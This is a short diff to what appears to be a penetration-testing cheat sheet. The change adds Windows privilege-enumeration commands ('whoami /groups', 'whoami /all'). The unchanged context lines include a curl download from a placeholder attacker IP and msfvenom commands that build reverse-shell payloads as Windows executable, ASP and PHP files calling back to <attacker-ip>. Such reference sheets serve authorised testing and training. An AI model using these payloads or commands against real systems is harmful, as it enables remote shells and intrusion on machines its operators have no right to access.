@@ -476,7 +476,6 @@ curl http://<attacker-ip>/<file> -o <output_file>
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f exe > shell-x64.exe
 ```
-
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f asp > shell.asp
 ```
@@ -494,6 +493,17 @@ msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<port>-f raw > shell.php
 
 <details>
   <summary><strong>Enumeration</strong></summary>
+
+### Get groups
+```ps
+whoami /groups
+```
+
+### Get priviliges
+```ps
+whoami /all
+```
+
 </details>
 
 <details>
